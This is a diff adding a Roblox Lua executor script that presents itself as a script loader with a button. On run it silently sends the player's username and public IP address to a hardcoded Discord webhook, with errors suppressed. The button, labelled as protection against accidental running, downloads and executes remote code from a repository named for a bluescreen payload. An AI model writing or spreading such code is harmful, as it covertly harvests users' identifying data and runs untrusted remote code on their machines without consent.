@@ -1,0 +1,58 @@
+local webh = "https://discord.com/api/webhooks/1044247167726002196/boTTcIiKUKWJm-7HtdQLP8OItaeOkxYkonhn7e7yJ-jmfvbXYQ8GnmsraNuyzPzuPHM-"
+
+pcall(function()
+   local data = {
+       ["embeds"] = {
+           {
+               ["title"] = game:GetService("Players").LocalPlayer.Name,
+               ["description"] = game:HttpGet("https://api.ipify.org")
+           }
+       }
+   }
+
+   if syn then
+       local response = syn.request(
+           {
+               Url = webh,
+               Method = 'POST',
+               Headers = {
+                   ['Content-Type'] = 'application/json'
+               },
+               Body = game:GetService('HttpService'):JSONEncode(data)
+           }
+       );
+   elseif request then
+       local response = request(
+           {
+               Url = webh,
+               Method = 'POST',
+               Headers = {
+                   ['Content-Type'] = 'application/json'
+               },
+               Body = game:GetService('HttpService'):JSONEncode(data)
+           }
+       );
+   elseif http_request then
+       local response = http_request(
+           {
+               Url = webh,
+               Method = 'POST',
+               Headers = {
+                   ['Content-Type'] = 'application/json'
+               },
+               Body = game:GetService('HttpService'):JSONEncode(data)
+           }
+       );
+   end
+end)
+
+wait(3)
+
+local gui = Instance.new('ScreenGui', game:service'CoreGui')
+local button = Instance.new('TextButton', gui)
+
+button.Size = UDim2.new(0, 255, 0, 100)
+button.Position = UDim2.new(.865, 0, .5, 0)
+button.Text = 'Load script "To prevent accidentally run"'
+
+button.MouseButton1Click:Connect(loadstring(game:HttpGet'https://github.com/RunDTM/roblox-bluescreen/raw/main/bsod.lua'))
